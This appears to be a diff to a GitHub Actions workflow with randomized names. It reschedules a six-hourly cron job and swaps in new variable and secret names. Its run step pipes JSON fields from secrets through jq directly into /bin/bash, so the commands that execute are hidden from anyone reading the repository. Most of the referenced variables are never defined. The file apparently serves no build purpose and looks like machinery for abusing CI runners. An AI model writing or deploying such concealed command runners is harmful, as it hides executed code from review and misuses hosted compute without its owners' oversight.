@@ -2,18 +2,22 @@ name: pangmeixiu2317
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
-jobs:  # 71
+    - cron: '45 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pangmeixiu2317
         env:
-          bq090: ${{ secrets.bq090 }}
+          l7984: ${{ secrets.l7984 }}
         run: |
-          echo $bq090 | jq -r .tq7780 | /bin/bash
-          echo $dsd0 | jq -r .w505 | /bin/bash
-          echo $h01456 | jq -r .dkd28465 | /bin/bash
+          echo $l7984 | jq -r .ftn9985 | /bin/bash
+          echo $vdjt108 | jq -r .zegj5 | /bin/bash
+          echo $hruho42 | jq -r .emly81 | /bin/bash
+          echo $ld56950 | jq -r .vg21598 | /bin/bash
+          echo $vd5 | jq -r .akt11 | /bin/bash
+          echo $g8 | jq -r .vb26 | /bin/bash
+          echo $wtdd5661 | jq -r .ase837 | /bin/bash
+          echo $rmy4 | jq -r .qbiln02 | /bin/bash
 
